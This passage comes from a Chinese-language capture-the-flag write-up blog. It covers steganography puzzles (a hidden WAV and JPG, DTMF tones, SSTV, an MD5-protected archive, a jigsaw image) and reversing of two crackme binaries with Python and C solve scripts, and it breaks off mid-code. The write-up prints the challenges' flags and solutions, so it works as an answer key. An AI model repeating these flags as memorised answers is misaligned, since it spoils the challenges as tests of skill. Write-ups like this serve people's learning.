class="hljs-string">.wri</span><br>7465da057072696e 74a9007206000000  te.<span class="hljs-string">.prin</span> t.<span class="hljs-string">.r....</span><br>7206000000fa0766 6c61672e7079da08  r.<span class="hljs-string">.....f</span> lag.py..<br>3c6d6f64756c653e 0100000073040000  &lt;module&gt; <span class="hljs-string">....s...</span><br>000a020a01004190 409b0eccc7d6a2f9  <span class="hljs-string">......A.</span> @<span class="hljs-string">.......</span><br>df7fff3fffffffff 57fedfe2a159ef50  ..?<span class="hljs-string">....</span> W.<span class="hljs-string">...Y.P</span><br></code></pre></td></tr></table></figure><p>上面是一串base64</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">ZmxhZ<span class="hljs-number">3</span>ti<span class="hljs-symbol">NWJjZmM4</span><span class="hljs-symbol">Ny01</span>Y<span class="hljs-number">2</span>E<span class="hljs-number">2</span>LTQzZjEtYj<span class="hljs-name">M4</span><span class="hljs-symbol">NC01</span><span class="hljs-symbol">N2</span>QwOWI<span class="hljs-number">4</span>ODZjYTl<span class="hljs-number">9</span>u<br>base<span class="hljs-number">64</span>：<br>flag&#123;b<span class="hljs-number">5</span>bcfc<span class="hljs-number">87</span><span class="hljs-number">-5</span>ca<span class="hljs-number">6</span><span class="hljs-number">-43</span>f<span class="hljs-number">1</span>-b<span class="hljs-number">384</span><span class="hljs-number">-57</span>d<span class="hljs-number">09</span>b<span class="hljs-number">886</span>ca<span class="hljs-number">9</span>&#125;<br><br><span class="hljs-attr"># Dest0</span><span class="hljs-name">g3</span>&#123;b<span class="hljs-number">5</span>bcfc<span class="hljs-number">87</span><span class="hljs-number">-5</span>ca<span class="hljs-number">6</span><span class="hljs-number">-43</span>f<span class="hljs-number">1</span>-b<span class="hljs-number">384</span><span class="hljs-number">-57</span>d<span class="hljs-number">09</span>b<span class="hljs-number">886</span>ca<span class="hljs-number">9</span>&#125;<br></code></pre></td></tr></table></figure><p>但是这不是我们想要的flag。我给他套了一个Dest0g3交上去不对。</p><p>下面这段话就看的我头大了。没有看懂这是啥意思。感觉像是让python脚本来写出flag。那么这个flag.py在哪里呢？</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">Find it in your folder<br><span class="hljs-keyword">open</span> <span class="hljs-keyword">file</span> <span class="hljs-keyword">write</span> <span class="hljs-keyword">print</span> <br>flag.<span class="hljs-keyword">py</span><br><span class="hljs-symbol">&lt;module&gt;</span><br></code></pre></td></tr></table></figure><p>后面试了一下直接把flag提交了，没想到竟然过了…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># flag&#123;b5bcfc87-5ca6-43f1-b384-57d09b886ca9&#125;</span><br></code></pre></td></tr></table></figure><h2 id="4096"><a class="markdownIt-Anchor" href="#4096"></a> 4096</h2><p>启动靶机，是一个4096小游戏，在local_storage_manager.js中找到了一部分的flag。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getPartFlag</span>(<span class="hljs-params">score</span>) &#123;<br>  <span class="hljs-keyword">if</span> (score &gt; <span class="hljs-number">10000</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Q29uZ3JhdHVsYXRpb25zLCB0aGlzIGlzIHBhcnQgb2YgdGhlIGZsYWc6IE5HVmxOeTFpTmpjekxUazNNV1E0TVdZNFlqRTNOMzA9Lg==&quot;</span>);<br>  &#125;<br>&#125;<br># 4ee7-b673-971d81f8b177&#125;<br></code></pre></td></tr></table></figure><p>在看网页元素的时候一个img很奇怪。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;favicon.png&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>大小为1，但实际上图片大小不是这个。把这个文件下载下来。</p><p>文件大小不对。这个png有12mb。很显然里面藏了东西。</p><p>二进制打开看看。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">RIFFö¾WAVEfmt <br></code></pre></td></tr></table></figure><p>在PNG头的下方还有一个RIFF头，这是一个音频文件。把PNG部分删了之后就可以用音频打开了。音频隐写我不太会说实话。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span>part_flag<span class="hljs-selector-class">.jpg</span>.....<br></code></pre></td></tr></table></figure><p>文件的尾部还有一个jpg。binwalk分离出来一个压缩包。里面是这个文件。但是需要密码。我觉得密码是在音频中。</p><p>前面部分和最后很明显是拨号音，只截取前后的DTMF的话得到的是：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">74958097831</span><br></code></pre></td></tr></table></figure><p>但这也不是密码啊。这是个什么脑洞。</p><p>问了一下我们组的人，叫我试试SSTV。说实话我是没想到是SSTV，也算是长见识了，第一次做这种题了。</p><p>sstv解码之后就是一张图片了，不过是倒过来的。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">password:<br><br><br><br><span class="hljs-constructor">MD5(<span class="hljs-params">cell</span> <span class="hljs-params">phone</span> <span class="hljs-params">number</span>)</span><br></code></pre></td></tr></table></figure><p>电话号码我们已经拿到了，所以直接md5看看。</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">MD5:</span><br><span class="hljs-number">6</span>c6551787d7071ff48400b855b851ccb<br></code></pre></td></tr></table></figure><p>结果并不是这个密码。手机号好像没有7开头的吧，而我们得到的数据最后一位是1，说不定是将得到的数据反转。试试。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">74958097831</span> -&gt; <span class="hljs-number">13879085947</span><br>MD5:<br><span class="hljs-number">3</span>f119efa3254ae786fe44aff4582faa4<br></code></pre></td></tr></table></figure><p>结果还是不对…我是直接用的数字进行加密的，说不定是先对字符串进行编码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>md5(<span class="hljs-string">b&quot;13879085947&quot;</span>).hexdigest()<br><span class="hljs-string">&#x27;32fc1b5487cb447f792a19418b92544e&#x27;</span><br></code></pre></td></tr></table></figure><p>这下终于解开了。</p><p>结果里面是个小拼图。</p><img src="https://s2.loli.net/2022/05/26/NlDXTEFbQ5tzogG.jpg" alt="part_flag" style="zoom:50%;" /><p>这里直接用工具就可以解了，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~/gaps/gaps/bin]<br>└─$ python3 gaps --image=part_flag.jpg --size=64 --save<br><br>=== Population:  200<br>=== Generations: 20<br>=== Piece size:  64 px<br>=== Pieces:      240<br><br>=== Analyzing image: ██████████████████████████████████████████████████ 100.0% <br>=== Solving puzzle:  ███████████████████████████████████████----------- 78.9% <br><br>=== GA terminated<br>=== There was no improvement for 10 generations<br><br>=== Done in 17.401 s<br>=== Result saved as &#x27;part_flag_solution.jpg&#x27;<br>=== Close figure to exit<br></code></pre></td></tr></table></figure><p>结果这个每次跑都不太一样，没有那种可以完美复原的。看来只能自己来拼接了。</p><img src="https://s2.loli.net/2022/05/26/hZJM13C4yniNSmu.jpg" alt="part_flag_solution" style="zoom:50%;" /><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">RGVzdD<br>kMTE0Zi05Z<br>BnM3tlZDR<br>U0<br>W<br><span class="hljs-section">LQ</span><br><span class="hljs-section">==</span><br></code></pre></td></tr></table></figure><p>写个脚本跑一下结果吧。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><br>table = [<span class="hljs-string">&quot;RGVzdD&quot;</span>,<span class="hljs-string">&quot;kMTE0Zi05Z&quot;</span>,<span class="hljs-string">&quot;BnM3tlZDR&quot;</span>,<span class="hljs-string">&quot;U0&quot;</span>,<span class="hljs-string">&quot;W&quot;</span>,<span class="hljs-string">&quot;LQ&quot;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.permutations(table, <span class="hljs-built_in">len</span>(table)):<br>    data = <span class="hljs-string">&#x27;&#x27;</span>.join(i) + <span class="hljs-string">&quot;==&quot;</span><br>    data = b64decode(data)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;Dest0g3&#123;&quot;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-built_in">print</span>(data)<br>        <br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9eM\x16-&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9eM\x0bA&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9ee4-&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9eb\xd0S&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9d\xb4\x14\xd1&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4d114f-9d\xb4\x16S&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4T\xd2C\x13\x13Fb\xd3\x96V-&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4T\xd2C\x13\x13Fb\xd3\x96KA&#x27;</span><br><span class="hljs-string">b&#x27;Dest0g3&#123;ed4T\xd1i\x0cLM\x19\x8bNY-&#x27;</span><br><span class="hljs-string">....</span><br><span class="hljs-string">....</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># Dest0g3&#123;ed4d114f-9ee4-</span><br></code></pre></td></tr></table></figure><p>和上面的flag进行组合得到：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit"># Dest0g3&#123;ed4d114f<span class="hljs-string">-9</span>ee4<span class="hljs-string">-4</span>ee7-b673<span class="hljs-string">-971</span>d81f8b177&#125;<br></code></pre></td></tr></table></figure><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="simplexor"><a class="markdownIt-Anchor" href="#simplexor"></a> simpleXOR</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v4[<span class="hljs-number">72</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-160h]</span><br>  <span class="hljs-type">char</span> v5[<span class="hljs-number">52</span>]; <span class="hljs-comment">// [rsp+120h] [rbp-40h] BYREF</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+154h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+158h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+15Ch] [rbp-4h]</span><br><br>  v6 = <span class="hljs-number">247</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input flag:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, v5);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">35</span>; ++i )<br>  &#123;<br>    v4[i + <span class="hljs-number">36</span>] = v5[i];<br>    v4[i] = v6 ^ (v4[i + <span class="hljs-number">36</span>] + i);<br>  &#125;<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">0x23</span>; ++j )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v4[j] != result_0[j] )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wrong!!!&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( j == <span class="hljs-number">35</span> )<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success!!!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>找到result_0的值：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xb3</span>,<span class="hljs-number">0</span>x91,<span class="hljs-number">0</span>x82,<span class="hljs-number">0</span>x80,<span class="hljs-number">0</span>xc3,<span class="hljs-number">0</span>x9b,<span class="hljs-number">0</span>xce,<span class="hljs-number">0</span>x75,<br><span class="hljs-attribute">0xcf</span>,<span class="hljs-number">0</span>x9c,<span class="hljs-number">0</span>x9a,<span class="hljs-number">0</span>x85,<span class="hljs-number">0</span>x85,<span class="hljs-number">0</span>xcd,<span class="hljs-number">0</span>xb8,<span class="hljs-number">0</span>x84,<br><span class="hljs-attribute">0xaa</span>,<span class="hljs-number">0</span>x7d,<span class="hljs-number">0</span>xbd,<span class="hljs-number">0</span>xbb,<span class="hljs-number">0</span>xb1,<span class="hljs-number">0</span>xb5,<span class="hljs-number">0</span>x96,<span class="hljs-number">0</span>x71,<br><span class="hljs-attribute">0x8d</span>,<span class="hljs-number">0</span>x9e,<span class="hljs-number">0</span>x86,<span class="hljs-number">0</span>xbf,<span class="hljs-number">0</span>x73,<span class="hljs-number">0</span>xa8,<span class="hljs-number">0</span>xa3,<span class="hljs-number">0</span>x9c,<br><span class="hljs-attribute">0x83</span>,<span class="hljs-number">0</span>x65,<span class="hljs-number">0</span>x9e,<span class="hljs-number">0</span>x57<br></code></pre></td></tr></table></figure><p>求逆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><br>data = [<span class="hljs-number">0xb3</span>,<span class="hljs-number">0x91</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0x80</span>,<br>        <span class="hljs-number">0xc3</span>,<span class="hljs-number">0x9b</span>,<span class="hljs-number">0xce</span>,<span class="hljs-number">0x75</span>,<br>        <span class="hljs-number">0xcf</span>,<span class="hljs-number">0x9c</span>,<span class="hljs-number">0x9a</span>,<span class="hljs-number">0x85</span>,<br>        <span class="hljs-number">0x85</span>,<span class="hljs-number">0xcd</span>,<span class="hljs-number">0xb8</span>,<span class="hljs-number">0x84</span>,<br>        <span class="hljs-number">0xaa</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0xbd</span>,<span class="hljs-number">0xbb</span>,<br>        <span class="hljs-number">0xb1</span>,<span class="hljs-number">0xb5</span>,<span class="hljs-number">0x96</span>,<span class="hljs-number">0x71</span>,<br>        <span class="hljs-number">0x8d</span>,<span class="hljs-number">0x9e</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0xbf</span>,<br>        <span class="hljs-number">0x73</span>,<span class="hljs-number">0xa8</span>,<span class="hljs-number">0xa3</span>,<span class="hljs-number">0x9c</span>,<br>        <span class="hljs-number">0x83</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x9e</span>,<span class="hljs-number">0x57</span>]<br><br>key = <span class="hljs-number">247</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((data[i]^key) - i), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-comment"># Dest0g3&#123;0bcgf-AdMy892-KobPW-hB6LTqG&#125;</span><br></code></pre></td></tr></table></figure><h2 id="hi"><a class="markdownIt-Anchor" href="#hi"></a> hi</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-ACh]</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+8h] [rbp-A8h]</span><br>  <span class="hljs-type">char</span> enc[<span class="hljs-number">45</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-A0h]</span><br>  <span class="hljs-type">char</span> str[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [rsp+40h] [rbp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+A8h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  *(_QWORD *)str = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">8</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">16</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">24</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">32</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">40</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">48</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">56</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">64</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">72</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">80</span>] = <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)&amp;str[<span class="hljs-number">88</span>] = <span class="hljs-number">0LL</span>;<br>  *(_DWORD *)&amp;str[<span class="hljs-number">96</span>] = <span class="hljs-number">0</span>;<br>  *(_QWORD *)enc = <span class="hljs-number">0x9F8E7A1CC6486497</span>LL;<br>  *(_QWORD *)&amp;enc[<span class="hljs-number">8</span>] = <span class="hljs-number">0x69EEF382E760BD46</span>LL;<br>  *(_QWORD *)&amp;enc[<span class="hljs-number">16</span>] = <span class="hljs-number">0xB9C017E2E30EF749</span>LL;<br>  *(_QWORD *)&amp;enc[<span class="hljs-number">24</span>] = <span class="hljs-number">0x98410148A430392C</span>LL;<br>  *(_QWORD *)&amp;enc[<span class="hljs-number">32</span>] = <span class="hljs-number">0xE80E7411E5B5A939</span>LL;<br>  *(_DWORD *)&amp;enc[<span class="hljs-number">40</span>] = <span class="hljs-number">-1517552212</span>;<br>  enc[<span class="hljs-number">44</span>] = <span class="hljs-number">109</span>;<br>  fwrite(<span class="hljs-string">&quot;input: &quot;</span>, <span class="hljs-number">1uLL</span>, <span class="hljs-number">7uLL</span>, <span class="hljs-built_in">stdout</span>);<br>  fgets(str, <span class="hljs-number">46</span>, <span class="hljs-built_in">stdin</span>);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(str) != <span class="hljs-number">45</span> )<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">44</span>; ++i )<br>  &#123;<br>    v1 = <span class="hljs-number">23</span> * str[i];<br>    <span class="hljs-keyword">if</span> ( ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[i]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) + (_BYTE)v1 + x[i] - ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[i]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) != enc[i] )<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;good!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的数据初始化一部分放在了代码里面，对于enc变量，我们可以运行程序然后从内存里dump出来。这里面又是DWORD又是BYTE又是QWORD，还有负数在里面，自己写很有可能出问题，所以选择从内存中dump。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x7fffffffdf10</span>: <span class="hljs-number">0</span>x97    <span class="hljs-number">0</span>x64    <span class="hljs-number">0</span>x48    <span class="hljs-number">0</span>xc6    <span class="hljs-number">0</span>x1c    <span class="hljs-number">0</span>x7a    <span class="hljs-number">0</span>x8e    <span class="hljs-number">0</span>x9f<br><span class="hljs-attribute">0x7fffffffdf18</span>: <span class="hljs-number">0</span>x46    <span class="hljs-number">0</span>xbd    <span class="hljs-number">0</span>x60    <span class="hljs-number">0</span>xe7    <span class="hljs-number">0</span>x82    <span class="hljs-number">0</span>xf3    <span class="hljs-number">0</span>xee    <span class="hljs-number">0</span>x69<br><span class="hljs-attribute">0x7fffffffdf20</span>: <span class="hljs-number">0</span>x49    <span class="hljs-number">0</span>xf7    <span class="hljs-number">0</span>x0e    <span class="hljs-number">0</span>xe3    <span class="hljs-number">0</span>xe2    <span class="hljs-number">0</span>x17    <span class="hljs-number">0</span>xc0    <span class="hljs-number">0</span>xb9<br><span class="hljs-attribute">0x7fffffffdf28</span>: <span class="hljs-number">0</span>x2c    <span class="hljs-number">0</span>x39    <span class="hljs-number">0</span>x30    <span class="hljs-number">0</span>xa4    <span class="hljs-number">0</span>x48    <span class="hljs-number">0</span>x01    <span class="hljs-number">0</span>x41    <span class="hljs-number">0</span>x98<br><span class="hljs-attribute">0x7fffffffdf30</span>: <span class="hljs-number">0</span>x39    <span class="hljs-number">0</span>xa9    <span class="hljs-number">0</span>xb5    <span class="hljs-number">0</span>xe5    <span class="hljs-number">0</span>x11    <span class="hljs-number">0</span>x74    <span class="hljs-number">0</span>x0e    <span class="hljs-number">0</span>xe8<br><span class="hljs-attribute">0x7fffffffdf38</span>: <span class="hljs-number">0</span>xac    <span class="hljs-number">0</span>xfd    <span class="hljs-number">0</span>x8b    <span class="hljs-number">0</span>xa5    <span class="hljs-number">0</span>x6d <br></code></pre></td></tr></table></figure><p>x直接就在文件里面，直接找出来就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[i]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) + (_BYTE)v1 + x[i] - ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)((v1 + x[i]) &gt;&gt; <span class="hljs-number">31</span>) &gt;&gt; <span class="hljs-number">24</span>) != enc[i] )<br></code></pre></td></tr></table></figure><p>这里有一个BYTE转换，实际上v1是int类型的，这就丢数据了。我们逆向过程不太能解。由于这个题目数据前后没有关联性，所以可以采用爆破的方式，复杂度为O(n)，是可以爆破的，也就字符集*45的大小。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windef.h&gt;</span></span><br><br><span class="hljs-type">char</span> x[] = &#123;<span class="hljs-number">0x7b</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xf3</span>, <span 